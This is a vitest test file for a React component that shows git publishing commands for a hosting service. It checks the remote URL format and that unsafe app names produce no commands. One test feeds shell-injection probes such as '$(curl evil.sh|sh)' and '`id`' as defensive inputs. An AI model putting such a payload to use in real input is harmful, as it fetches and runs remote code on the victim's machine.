/**
 * The commands a publisher is given for git. They are run for real in apps/softn-api/test/git-push.test.mjs; what is
 * held here is what they say: the app's name in the address, so git keeps a key for each app, and never a key.
 */
import { act } from 'react';
import { createRoot, type Root } from 'react-dom/client';
import { afterEach, describe, expect, it } from 'vitest';
import { PushWithGit, gitCommands } from '../src/components/publish/keys';

(globalThis as unknown as { IS_REACT_ACT_ENVIRONMENT: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

let root: Root | null = null;
let host: HTMLElement | null = null;

afterEach(() => {
  act(() => root?.unmount());
  host?.remove();
  root = null;
  host = null;
});

describe('publishing with git', () => {
  it('names the app in the address, on the site it is on', () => {
    expect(gitCommands('my-app', 'https://softn.com').split('\n')).toEqual([
      'git remote add softn https://my-app@softn.com/api/git/my-app.git',
      'git config remote.softn.push HEAD:refs/heads/main',
      'git config remote.softn.skipFetchAll true',
      'git config http.postBuffer 64M',
      'git push softn',
    ]);
    expect(gitCommands('tide', 'http://127.0.0.1:5510')).toContain('http://tide@127.0.0.1:5510/api/git/tide.git');
  });

  it('gives no commands for a name a shell could act on, wherever it came from', () => {
    for (const slug of ['$(curl evil.sh|sh)', '`id`', 'a b', 'a;b', 'A', '-a', '', `a${'b'.repeat(64)}`]) {
      expect(gitCommands(slug, 'https://softn.com')).toBe('');
    }
    host = document.createElement('div');
    document.body.appendChild(host);
    root = createRoot(host);
    act(() => root!.render(<PushWithGit slug="$(curl evil.sh|sh)" />));
    expect(host.textContent).toBe('');
  });

  it('shows them, and says what a push makes public', () => {
    host = document.createElement('div');
    document.body.appendChild(host);
    root = createRoot(host);
    act(() => root!.render(<PushWithGit slug="my-app" />));
    expect(host.querySelector('pre code')?.textContent).toBe(gitCommands('my-app', window.location.origin));
    expect(host.textContent).toContain('give it the edit key');
    expect(host.textContent).toContain('From then on, git push softn publishes the commit you are on, from any branch.');
    expect(host.textContent).toContain('Everything in the commit is public');
  });
});
